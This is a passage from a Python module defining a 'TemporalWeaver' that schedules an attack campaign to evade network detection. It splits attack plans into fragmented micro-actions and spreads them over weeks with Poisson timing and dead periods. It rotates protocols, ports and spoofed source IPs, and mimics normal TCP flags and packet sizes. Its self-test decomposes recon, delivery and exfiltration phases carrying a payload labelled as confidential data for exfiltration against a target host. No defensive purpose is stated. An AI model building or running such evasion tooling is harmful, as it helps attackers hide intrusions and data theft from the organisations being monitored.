    ) -> List[Tuple[datetime, datetime]]:
        """Generate dead periods (2–7 days each) within the campaign window.

        One dead period per 30 days of campaign, placed randomly.
        """
        days = (tend - t0).days
        if days < 7:
            return []

        count = max(1, days // 30)
        dead_periods: List[Tuple[datetime, datetime]] = []
        total_seconds = int((tend - t0).total_seconds())
        min_dead_seconds = _MIN_DEAD_DAYS * 86400
        max_dead_seconds = _MAX_DEAD_DAYS * 86400
        min_gap = 3 * 86400  # minimum 3-day gap between dead periods

        for i in range(count):
            dead_len = self._rng.randint(min_dead_seconds, max_dead_seconds)
            max_start = max(0, total_seconds - dead_len)
            if max_start <= 0:
                continue
            start_offset = self._rng.randint(0, max_start)
            ds = t0 + timedelta(seconds=start_offset)
            de = ds + timedelta(seconds=dead_len)
            if de > tend:
                de = tend
            dead_periods.append((ds, de))

        return self._merge_intervals(dead_periods)

    def _merge_intervals(
        self,
        intervals: List[Tuple[datetime, datetime]],
    ) -> List[Tuple[datetime, datetime]]:
        """Merge overlapping datetime intervals."""
        if not intervals:
            return []
        sorted_intervals = sorted(intervals, key=lambda x: x[0])
        merged: List[Tuple[datetime, datetime]] = [sorted_intervals[0]]
        for current in sorted_intervals[1:]:
            last_start, last_end = merged[-1]
            if current[0] <= last_end:
                merged[-1] = (last_start, max(last_end, current[1]))
            else:
                merged.append(current)
        return merged

    def _compute_available_slots(
        self,
        t0: datetime,
        tend: datetime,
        dead_periods: List[Tuple[datetime, datetime]],
        action_count: int,
        profile: TrafficProfile,
    ) -> List[datetime]:
        """Compute available time slots for actions, excluding dead periods.

        Uses Poisson-distributed intervals biased by hourly traffic volume.
        """
        slots: List[datetime] = []
        current = t0

        # Build a quick dead-period lookup
        dead_starts: Set[int] = set()
        dead_ends: Set[int] = set()
        for ds, de in dead_periods:
            dead_starts.add(int(ds.timestamp()))
            dead_ends.add(int(de.timestamp()))

        def _is_in_dead_period(ts: datetime) -> bool:
            for ds, de in dead_periods:
                if ds <= ts <= de:
                    return True
            return False

        total_seconds = (tend - t0).total_seconds()

        while len(slots) < action_count and current < tend:
            if not _is_in_dead_period(current):
                slots.append(current)

            # Compute next interval via Poisson process biased by traffic volume
            hour = current.hour
            time_block = self._get_time_block(hour)
            base_lambda = self._poisson_lambda.get(time_block, 0.5)

            # Scale lambda by the relative traffic volume at this hour
            vol = profile.get_volume_for_hour(hour)
            mean_vol = sum(profile.hourly_volume) / 24 if sum(profile.hourly_volume) > 0 else 1.0
            if mean_vol > 0:
                volume_factor = vol / mean_vol
            else:
                volume_factor = 1.0

            scaled_lambda = base_lambda * volume_factor

            # Poisson interval: -ln(U) / lambda (in hours)
            u = self._rng.random()
            if u <= 0:
                u = 1e-9
            if scaled_lambda <= 0:
                scaled_lambda = 0.1
            interval_hours = -math.log(u) / scaled_lambda
            interval_seconds = max(1.0, interval_hours * 3600.0)

            # Add jitter (±500ms)
            jitter_ms = self._rng.randint(-_MAX_SCHEDULE_JITTER_MS, _MAX_SCHEDULE_JITTER_MS)
            interval_seconds += jitter_ms / 1000.0

            current += timedelta(seconds=max(0.1, interval_seconds))

        logger.debug(
            "Available slots computed: %d slots across %.1f hours",
            len(slots), total_seconds / 3600.0,
        )
        return slots

    def _assign_channels(
        self,
        actions: List[MicroAction],
        profile: TrafficProfile,
    ) -> Dict[int, ChannelDescriptor]:
        """Assign channel descriptors to actions based on profile.

        Each consecutive action uses a different protocol (round-robin
        through the profile's protocol distribution).
        """
        channel_map: Dict[int, ChannelDescriptor] = {}
        protocols = list(profile.protocol_distribution.keys()) if profile.protocol_distribution else self._protocols

        for idx, action in enumerate(actions):
            proto = protocols[idx % len(protocols)]
            port = self._rng.choice(self._ports.get(proto, [443]))
            src_ip = self._next_source_ip()
            ch = ChannelDescriptor(
                protocol=proto,
                port=port,
                source_ip=src_ip,
                ttl=self._rng.choice([64, 128, 255]),
                payload_padding=self._compute_padding(profile),
            )
            channel_map[idx] = ch
            action.channel = ch

        return channel_map

    def _enforce_dependency_order(
        self,
        actions: List[MicroAction],
    ) -> List[MicroAction]:
        """Ensure no action is scheduled before its dependencies."""
        # Build dependency graph
        action_map: Dict[str, MicroAction] = {a.action_id: a for a in actions}
        dependency_graph: Dict[str, List[str]] = {a.action_id: a.dependencies for a in actions}

        # Topological sort with tie-breaking by scheduled_at
        in_degree: Dict[str, int] = defaultdict(int)
        for aid, deps in dependency_graph.items():
            for dep in deps:
                if dep in action_map:
                    in_degree[aid] += 1

        # Start with actions that have no dependencies
        ready: List[MicroAction] = [
            a for a in actions if in_degree[a.action_id] == 0
        ]
        # Sort ready list by scheduled_at
        ready.sort(key=lambda a: a.scheduled_at or datetime.max.replace(tzinfo=timezone.utc))

        result: List[MicroAction] = []
        completed: Set[str] = set()
        ready_ids: Set[str] = {a.action_id for a in ready}
        processed: Set[str] = set()

        while ready:
            action = ready.pop(0)
            if action.action_id in processed:
                continue
            result.append(action)
            processed.add(action.action_id)
            completed.add(action.action_id)

            # Check dependents
            for other in actions:
                if other.action_id in processed:
                    continue
                if other.action_id in ready_ids:
                    continue
                if all(dep in completed for dep in other.dependencies):
                    ready.append(other)
                    ready_ids.add(other.action_id)
                    ready.sort(key=lambda a: a.scheduled_at or datetime.max.replace(tzinfo=timezone.utc))

        # Append any remaining actions (cycle resolution: break cycles by insertion order)
        for action in actions:
            if action.action_id not in processed:
                result.append(action)

        return result

    def _select_protocol_for_hour(
        self,
        hour: int,
        profile: TrafficProfile,
    ) -> str:
        """Select a protocol weighted by the profile's distribution for this hour."""
        if not profile.protocol_distribution:
            return self._rng.choice(self._protocols)

        protocols = list(profile.protocol_distribution.keys())
        weights = list(profile.protocol_distribution.values())
        # Normalise weights
        total_w = sum(weights)
        if total_w <= 0:
            return self._rng.choice(self._protocols)
        weights = [w / total_w for w in weights]
        return self._rng.choices(protocols, weights=weights, k=1)[0]

    def _next_source_ip(self) -> str:
        """Generate a unique source IP for channel rotation.

        Uses RFC 1918 / RFC 5735 ranges for internal, and generates plausible
        public IPs for external channels. Ensures no immediate reuse.
        """
        # 70% RFC 1918 private, 30% pseudo-public (for believable external channels)
        if self._rng.random() < 0.70:
            # Private ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
            pool = self._rng.choice([(10, 0, 0, 0), (172, 16, 0, 0), (192, 168, 0, 0)])
            if pool[0] == 10:
                ip = f"10.{self._rng.randint(0, 255)}.{self._rng.randint(0, 255)}.{self._rng.randint(1, 254)}"
            elif pool[0] == 172:
                ip = f"172.{self._rng.randint(16, 31)}.{self._rng.randint(0, 255)}.{self._rng.randint(1, 254)}"
            else:
                ip = f"192.168.{self._rng.randint(0, 255)}.{self._rng.randint(1, 254)}"
        else:
            # Plausible public IPs (avoid reserved ranges)
            octets = [self._rng.randint(1, 223)]
            for _ in range(3):
                octets.append(self._rng.randint(0, 255))
            ip = ".".join(str(o) for o in octets)

        # Avoid immediate reuse
        if ip in self._used_source_ips:
            return self._next_source_ip()
        self._used_source_ips.add(ip)
        # Limit the set size to prevent unbounded memory growth
        if len(self._used_source_ips) > 10000:
            self._used_source_ips.clear()
        return ip

    def _camouflage_tcp_flags(
        self,
        protocol: str,
        hour: int,
        profile: TrafficProfile,
    ) -> str:
        """Select TCP flags that match normal traffic for this time of day."""
        if protocol.startswith("TCP/"):
            # Common normal-looking combinations
            normal_flags = ["SA", "A", "PA", "FA", "RA"]
            return self._rng.choice(normal_flags)
        return ""

    def _compute_padding(self, profile: TrafficProfile) -> int:
        """Compute payload padding to match target's average packet size."""
        target_size = profile.avg_packet_size + self._rng.gauss(0, profile.packet_size_variance * 0.5)
        return max(0, int(target_size - 64))  # 64 bytes overhead for headers

    @staticmethod
    def _get_time_block(hour: int) -> str:
        """Map an hour (0–23) to a time-of-day block name."""
        for block_name, (start, end) in _TIME_BLOCKS.items():
            if start <= hour < end:
                return block_name
        return "evening"

    # ── Dunder Methods ─────────────────────────────────────────────────────

    def __repr__(self) -> str:
        return (
            f"TemporalWeaver(patience={self.patience_days}d, "
            f"policy={self.policy.name}, frag={self.fragmentation.name}, "
            f"threshold={self.entropy_threshold:.3f})"
        )


# ── Entropy Comparator (standalone utility) ────────────────────────────────────

class EntropyComparator:
    """Statistical similarity engine for traffic profile comparison.

    Provides KS-test-inspired CDF comparison, KL divergence estimation,
    and Jensen-Shannon distance between two traffic distributions.
    """

    @staticmethod
    def ks_similarity(profile_a: TrafficProfile, profile_b: TrafficProfile) -> float:
        """Compute CDF similarity between two TrafficProfiles.

        Returns a value in [0.0, 1.0] where 1.0 is perfect match.
        """
        def _cdf(values: List[float]) -> List[float]:
            total = sum(values)
            if total == 0:
                return [0.0] * len(values)
            acc = 0.0
            cdf = []
            for v in values:
                acc += v / total
                cdf.append(acc)
            return cdf

        cdf_a = _cdf(profile_a.hourly_volume)
        cdf_b = _cdf(profile_b.hourly_volume)
        max_diff = max(abs(a - b) for a, b in zip(cdf_a, cdf_b))
        return 1.0 - max_diff

    @staticmethod
    def kl_divergence(profile_a: TrafficProfile, profile_b: TrafficProfile) -> float:
        """Approximate Kullback-Leibler divergence (A || B) on hourly distributions."""
        total_a = sum(profile_a.hourly_volume) or 1.0
        total_b = sum(profile_b.hourly_volume) or 1.0
        div = 0.0
        for va, vb in zip(profile_a.hourly_volume, profile_b.hourly_volume):
            pa = va / total_a
            pb = vb / total_b
            if pa > 0 and pb > 0:
                div += pa * math.log(pa / pb)
        return div

    @staticmethod
    def jensen_shannon_distance(profile_a: TrafficProfile, profile_b: TrafficProfile) -> float:
        """Jensen-Shannon distance (symmetrised KL). Result in [0, 1]."""
        total_a = sum(profile_a.hourly_volume) or 1.0
        total_b = sum(profile_b.hourly_volume) or 1.0

        js = 0.0
        for va, vb in zip(profile_a.hourly_volume, profile_b.hourly_volume):
            pa = va / total_a
            pb = vb / total_b
            pm = (pa + pb) / 2.0
            term = 0.0
            if pa > 0 and pm > 0:
                term += pa * math.log(pa / pm)
            if pb > 0 and pm > 0:
                term += pb * math.log(pb / pm)
            js += term / 2.0

        # Bound to [0, 1] (theoretical max is ln(2), so normalise)
        return min(1.0, max(0.0, js / math.log(2)))


# ── Module-level convenience ───────────────────────────────────────────────────

def create_weaver(
    patience_days: int = _DEFAULT_PATIENCE_DAYS,
    policy: str = "poisson",
    fragmentation: str = "field_wise",
    entropy_threshold: float = _ENTROPY_MATCH_THRESHOLD,
    seed: Optional[int] = None,
) -> TemporalWeaver:
    """Factory for TemporalWeaver with string-based policy/fragmentation selection.

    Args:
        patience_days: Campaign duration in days.
        policy: One of ``poisson``, ``uniform_jitter``, ``mimic_traffic``, ``custom_lambda``.
        fragmentation: One of ``byte_wise``, ``field_wise``, ``bit_wise``, ``block_wise``.
        entropy_threshold: Minimum CDF similarity for entropy matching.
        seed: Optional PRNG seed.

    Returns:
        Configured TemporalWeaver instance.

    Raises:
        KeyError: If policy or fragmentation string is unrecognised.
    """
    return TemporalWeaver(
        patience_days=patience_days,
        policy=SchedulePolicy[policy.upper()],
        fragmentation=FragmentationMode[fragmentation.upper()],
        entropy_threshold=entropy_threshold,
        seed=seed,
    )


# ── Self-Test ───────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG, format="%(levelname)s %(name)s %(message)s")

    print("═" * 70)
    print("TemporalWeaver — Self-Test")
    print("═" * 70)

    weaver = TemporalWeaver(patience_days=30, seed=42)

    # Build a sample traffic profile
    traces = []
    for hour in range(24):
        count = 100 + int(200 * (1 + math.sin(math.pi * (hour - 6) / 12)))
        traces.append({"hour": hour, "packet_count": count, "protocol": "TCP/HTTPS"})
    profile = weaver.build_traffic_profile(traces, name="test_profile")
    print(f"\nTraffic profile: {profile.name}")
    print(f"  Peak hours: {profile.peak_hours}")
    print(f"  Idle periods: {profile.idle_periods}")

    # Decompose a sample attack plan
    attack_plan = {
        "phases": [
            {"type": "recon_passive", "packets": 5, "name": "scan"},
            {"type": "probe", "packets": 3, "name": "fingerprint"},
            {"type": "delivery", "packets": 10, "name": "inject"},
            {"type": "exfil", "packets": 8, "name": "extract"},
        ],
        "payload": b"CONFIDENTIAL_DATA_TO_EXFILTRATE" * 10,
        "target": {"host": "192.168.1.100", "port": 443},
    }
    micro = weaver.decompose_attack(attack_plan)
    print(f"\nMicro-actions: {len(micro)}")

    # Generate schedule
    schedule = weaver.generate_schedule(30, micro, profile)
    print(f"Schedule: {schedule.action_count} actions, {len(schedule.dead_periods)} dead periods")

    # Insert additional dead time
    schedule = weaver.insert_dead_time(schedule, count=2)
    print(f"After dead time insertion: {len(schedule.dead_periods)} dead periods")

    # Entropy match
    score = weaver.entropy_match(profile, schedule)
    print(f"Entropy match score: {score:.4f} (threshold={weaver.entropy_threshold})")

    # Weave a sample action
    if micro:
        first_action = micro[0]
        if first_action.scheduled_at:
            woven = weaver.weave_action(first_action, first_action.scheduled_at, profile)
            print(f"\nWoven action: {woven.action_id}")
            print(f"  Channel: {woven.channel.protocol}:{woven.channel.port} from {woven.channel.source_ip}")
            print(f"  Scheduled: {woven.scheduled_at.isoformat()}")

    # Reassembly test
    fragments = [m.payload for m in micro if m.payload]
    if fragments:
        reassembled = weaver.reassemble_data(fragments)
        print(f"\nReassembled data: {len(reassembled)} bytes")

    # Channel rotation test
    if micro:
        rotated = weaver.rotate_channel(micro[0])
        print(f"\nRotated channel: {rotated.channel.protocol}:{rotated.channel.port}")

    # Export / import round-trip
    exported = weaver.export_schedule(schedule)
    imported = weaver.import_schedule(exported)
    print(f"\nRound-trip: exported {exported['action_count']} actions, imported {imported.action_count} actions")
    assert exported["action_count"] == imported.action_count, "Round-trip mismatch!"

    # EntropyComparator
    profile2 = weaver.build_traffic_profile(traces, name="similar")
    ks = EntropyComparator.ks_similarity(profile, profile2)
    js = EntropyComparator.jensen_shannon_distance(profile, profile2)
    print(f"\nProfile similarity: KS={ks:.4f}, JS distance={js:.4f}")

    print("\nAll tests passed.\n")
